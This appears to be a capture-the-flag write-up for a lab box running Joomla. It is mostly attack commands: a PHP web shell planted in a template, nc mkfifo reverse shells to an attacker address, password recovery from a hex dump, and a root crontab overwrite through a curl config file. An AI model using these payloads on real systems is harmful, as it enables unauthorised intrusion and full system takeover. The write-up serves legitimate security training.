
# Table of Contents

1.  [ENUMERATION](#orga742f69)
    1.  [APACHE](#orge5b757a)
2.  [FOOTHOLD](#org3a495d6)
3.  [LATERAL MOVEMENT](#org4dd0ac8)
    1.  [HEX DUMP](#org6189c1f)
4.  [PRIVILEGE ESCALATION](#org8b933c6)
    1.  [MANIPULATING THE CONFIG](#org3e11036)


<a id="orga742f69"></a>

# ENUMERATION

    NMAP

    ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.150 | grep ^[0-9] | cut -d'/' -f 1 | tr '\n' ',' | sed s/,$//)
    nmap -sC -sV -p$ports 10.10.10.150 --open

Apache is running on port 80 and SSH on port 22.


<a id="orge5b757a"></a>

## APACHE

Navigating to port 80, we come across a Joomla website.

The page contains two usernames: “Super user” and Floris. Checking the HTML source of the page reveals a comment saying \`secret.txt\`. Checking [http://10.10.10.150/secret.txt](http://10.10.10.150/secret.txt) we find a string which is base64 encoded.

    curl -s http://10.10.10.150/secret.txt | base64 -d

Going to the admin page at [http://10.10.10.150/administrator/](http://10.10.10.150/administrator/) and trying to login with the username Floris logs us in.


<a id="org3a495d6"></a>

# FOOTHOLD

Logging in gives us access to the control panel. On the right side under Configuration, click on Templates > Templates > Protostar. Now click on a PHP file like \`index.php\` and add command execution.

    system($_REQUEST['pwn']);

Click on save and navigate to \`/index.php\` to issue commands. Now that we have RCE, we can get a reverse shell.

    curl http://10.10.10.150/index.php -G --data-urlencode 'pwn=rm
    /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 1234 >/tmp/f
    '	      


<a id="org4dd0ac8"></a>

# LATERAL MOVEMENT


<a id="org6189c1f"></a>

## HEX DUMP

Navigating to \`/home/floris\` we find a file named \`password<sub>backup</sub>\`. The file looks like a hex dump done using \`xxd\` which can be reversed.

    cd /tmp
    cp /home/floris/password_backup .
    cat password_backup | xxd -r > bak
    file bak

The resulting file is bzip2 compressed.
The file appears to be repeatedly archived. The steps to decompress it are

    bzip2 -d bak
    file bak.out
    mv bak.out bak.gz
    gzip -d bak.gz
    file bak
    bzip2 -d bak
    file bak.out
    tar xf bak.out
    cat password.txt

The file found was password.txt which is the password for floris. We can now SSH in as floris with
the discovered password.

    ssh floris@10.10.10.150


<a id="org8b933c6"></a>

# PRIVILEGE ESCALATION

We enumerate the running crons using \`pspy\`. Download the smaller binary and transfer it to the box.

    wget
    https://github.com/DominicBreuker/pspy/releases/download/v1.0.0/pspy64s

    scp pspy64s floris@10.10.10.150:/tmp
    cd /tmp
    chmod +x pspy64s
    ./pspy64s

After letting it run for a minute, we’ll find a cron running. According to \`curl\` manpage, the \`-K\` option is used to specify a config file. The cron uses input as the config and outputs to report. The input file is owned by our group, so we can write our own config. From the manpage, we know that the “output” parameter can be used to specify the output file. We can create a malicious crontab and overwrite it on the box.


<a id="org3e11036"></a>

## MANIPULATING THE CONFIG

First create a malicious crontab locally and start a simple HTTP server.

    cp /etc/crontab .
    echo '* * * * * root rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i
    2>&1|nc 10.10.14.2 1234 >/tmp/f ' >> crontab
    python3 -m http.server 80

Now edit the input config with the contents:

    url = "http://10.10.14.2/crontab"
    outpu t = "/etc/crontab"

A shell should be received within a minute.

    nc -lnvp 1234

